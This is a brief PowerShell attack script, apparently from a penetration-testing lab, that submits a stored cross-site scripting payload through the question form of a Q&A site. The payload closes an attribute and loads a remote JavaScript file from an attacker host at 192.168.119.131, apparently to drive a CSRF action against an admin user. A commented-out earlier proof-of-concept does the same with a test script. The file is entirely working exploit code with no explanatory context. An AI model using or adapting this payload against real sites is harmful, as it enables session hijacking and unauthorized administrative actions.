<#
$xss_poc  = "`"><script src='http://192.168.119.131/xss_working'></script>"
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_poc&category=1"
#>
$xss_payload = "`"><script src='http://192.168.119.131/admin-usr-csrf.js'></script>"
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"